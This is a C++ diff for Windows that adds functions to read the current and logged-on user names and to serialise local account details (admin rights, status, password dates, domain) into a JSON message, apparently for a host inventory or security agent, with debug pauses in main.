+BOOL GetLocalCurUserName(CString& strUserName)
+{
+	BOOL bRet = FALSE;
+	DWORD sessionId;
+	LPWSTR ppBuffer[100];
+	DWORD bufferSize;
+
+	sessionId = WTSGetActiveConsoleSessionId();
+
+	bRet = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, ppBuffer, &bufferSize);
+
+	printf(" GetLocal1CurUserName --> %s", *ppBuffer);
+
+	if (bRet == TRUE)
+	{
+		strUserName = *ppBuffer;
+		WTSFreeMemory(ppBuffer);
+	}
+
+End:
+	return bRet;
+}
+
+BOOL ConvertStructToJson(vector<UserAccount>& sUsers, CString& strJson)
+{
+	static ULONG itemid_index = 1;
+	BOOL bRet = FALSE;
+	cJSON* pRoot = cJSON_CreateObject();
+	if (pRoot)
+	{
+		cJSON* pData = cJSON_CreateObject();
+		cJSON* pResult = NULL;
+
+		do
+		{
+			if (pData == NULL)
+			{
+				printf("[SendResult] data null!!!");
+				break;
+			}
+
+			pResult = cJSON_CreateArray();
+			if (pResult == NULL)
+			{
+				printf("[SendResult] result null");
+				break;
+			}
+
+			CStringA strItemId;
+			for (auto& itemUser : sUsers)
+			{
+				cJSON* pItem = cJSON_CreateObject();
+				if (pItem)
+				{
+					CStringA szaUser = CW2A(CStringW(itemUser.UserName), CP_UTF8);
+					cJSON_AddStringToObject(pItem, "account_name", szaUser);
+
+					// CStringA szaSID = CW2A(itemUser.strSID, CP_UTF8);
+					CStringA szaSID = CW2A(CStringW(itemUser.strSID), CP_UTF8);
+					cJSON_AddStringToObject(pItem, "account_id", szaSID);
+
+					// CStringA szaDomain = CW2A(itemUser.strDomain, CP_UTF8);
+					CStringA szaDomain = CW2A(CStringW(itemUser.strDomain), CP_UTF8);
+					cJSON_AddStringToObject(pItem, "account_domain", szaDomain);
+
+					if (itemUser.bAdmin)
+					{
+						cJSON_AddStringToObject(pItem, "account_rights", "1");
+					}
+					else
+					{
+						cJSON_AddStringToObject(pItem, "account_rights", "2");
+					}
+
+					if (itemUser.bDisabled)
+					{
+						cJSON_AddStringToObject(pItem, "account_status", "2");
+					}
+					else
+					{
+						cJSON_AddStringToObject(pItem, "account_status", "1");
+					}
+
+					// CStringA szGroup = CW2A(itemUser.strGroup, CP_UTF8);
+					CStringA szGroup = CW2A(CStringW(itemUser.strGroup), CP_UTF8);
+					cJSON_AddStringToObject(pItem, "account_group", szGroup);
+
+					cJSON_AddStringToObject(pItem, "account_shell", "");
+
+					CTime tNow = CTime::GetCurrentTime();
+					if (itemUser.strLastLogon.IsEmpty())
+					{
+						if (itemUser.tmLastLogon > 0 && itemUser.tmLastLogon <= tNow.GetTime())
+						{
+							CTime tm = itemUser.tmLastLogon;
+							CStringA sTime = tm.Format("%Y-%m-%d %H:%M:%S");
+							cJSON_AddStringToObject(pItem, "last_login_time", sTime);
+						}
+						else
+						{
+							cJSON_AddStringToObject(pItem, "last_login_time", "");
+						}
+					}
+					else
+					{
+						CStringA saLastLogon = itemUser.strLastLogon;
+						cJSON_AddStringToObject(pItem, "last_login_time", saLastLogon);
+					}
+
+					cJSON_AddStringToObject(pItem, "account_gid", "0");
+					cJSON_AddStringToObject(pItem, "account_login_type", "3");
+					cJSON_AddStringToObject(pItem, "account_sudo", "2");
+
+					CStringA sTmp = itemUser.strHomePath;
+					cJSON_AddStringToObject(pItem, "account_homepath", sTmp);
+
+					sTmp.Format("%d", itemUser.dwPwStatus);
+					cJSON_AddStringToObject(pItem, "pw_status", sTmp);
+					cJSON_AddStringToObject(pItem, "pw_change_time", itemUser.strPwdChangeTime);
+					cJSON_AddStringToObject(pItem, "pw_expiry_time", itemUser.strPwdExpireTime);
+					cJSON_AddStringToObject(pItem, "pw_lock_time", itemUser.strAccountType.IsEmpty()
+						? "" : itemUser.strAccountType);
+					cJSON_AddStringToObject(pItem, "account_type", itemUser.strAccountType);
+					cJSON_AddStringToObject(pItem, "account_isdomain", itemUser.strIsDomain);
+
+					cJSON* pKeys = cJSON_CreateArray();
+					if (pKeys)
+					{
+						cJSON_AddItemToObject(pItem, "public_key", pKeys);
+					}
+
+					cJSON_AddItemToArray(pResult, pItem);
+				}
+			}
+
+			bRet = TRUE;
+		} while (FALSE);
+
+		if (bRet)
+		{
+			cJSON_AddStringToObject(pData, "handler_type", "1");
+			cJSON_AddItemToObject(pData, "result", pResult);
+
+			cJSON_AddStringToObject(pRoot, "msg_type", "1");
+
+			cJSON_AddItemToObject(pRoot, "data", pData);
+
+			char* pLog = cJSON_PrintUnformatted(pRoot);
+			// char* pLog = cJSON_Print(pRoot);
+			if (pLog)
+			{
+				CString strLog = CA2W(pLog, CP_UTF8);
+
+				strJson = strLog;
+				free(pLog);
+			}
+
+			cJSON_Delete(pRoot);
+		}
+		else
+		{
+			if (pResult)
+			{
+				cJSON_Delete(pResult);
+			}
+
+			if (pData)
+			{
+				cJSON_Delete(pData);
+			}
+
+			cJSON_Delete(pRoot);
+		}
+	}
+
+	printf("[SendMalAccountResult] bRet : %d", bRet);
+	return bRet;
+}
+
+
+bool Get_LogUser(std::wstring& wsName)
+{
+	HWND hwnd = ::GetShellWindow();
+	if (nullptr == hwnd) {
+		return false;
+	}
+
+	DWORD dwProcessID = 0;
+	GetWindowThreadProcessId(hwnd, &dwProcessID);
+	if (0 == dwProcessID) {
+		return false;
+	}
+
+	HANDLE hProc = NULL;
+	HANDLE hToken = NULL;
+	TOKEN_USER* pTokenUser = NULL;
+
+	// Open the process with PROCESS_QUERY_INFORMATION access
+	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
+	if (hProc == NULL)
+	{
+		return false;
+	}
+	if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
+	{
+		return false;
+	}
+
+	DWORD dwNeedLen = 0;
+	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwNeedLen);
+	if (dwNeedLen > 0)
+	{
+		pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
+		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwNeedLen, &dwNeedLen))
+		{
+			return false;
+		}
+	}
+	else
+	{
+		return false;
+	}
+
+	SID_NAME_USE sn;
+	WCHAR szDomainName[MAX_PATH];
+	DWORD dwDmLen = MAX_PATH;
+
+	WCHAR wstrName[MAX_PATH] = {};
+	DWORD nNameLen = MAX_PATH;
+	LookupAccountSidW(NULL, pTokenUser->User.Sid, wstrName, &nNameLen,
+		szDomainName, &dwDmLen, &sn);
+
+	wsName = wstrName;
+
+	if (hProc)
+		::CloseHandle(hProc);
+	if (hToken)
+		::CloseHandle(hToken);
+	if (pTokenUser)
+		delete[](char*)pTokenUser;
+
+	return true;
+}
+
 
 void main(int argc, const char* argv[])
 {
 	CString strtDomainName;
 	getUserName(strtDomainName);
 
+	getchar();
+
 	IsDomainUser();
+
+	getchar();
+	
+	wstring wsLogUser;
+	Get_LogUser(wsLogUser);
+	std::wcout << "Get_LogUser:" << wsLogUser.c_str() << endl;
+	getchar();
 
 	vector<UserAccount> users;
 	GetUsers(users);
 	GetCurDomainUser(users);
 
-	// GetFullDeviceName();
+	getchar();
+	std::cout << "--------" << endl;
+
 	wstring user, domain;
 	GetCurrentUserAndDomain(user, domain);
+
+	std::wcout << user.c_str() << " " << domain.c_str() << endl;
+
+	return;
+
+	CString strJson;
+	ConvertStructToJson(users, strJson);
+
+	ofstream outfile;
+	outfile.open("afile.dat");
+	outfile << strJson.GetBuffer() << endl;
+	outfile.close();
+
+	// GetFullDeviceName();
 
 	GetHostNameWithWs();
 
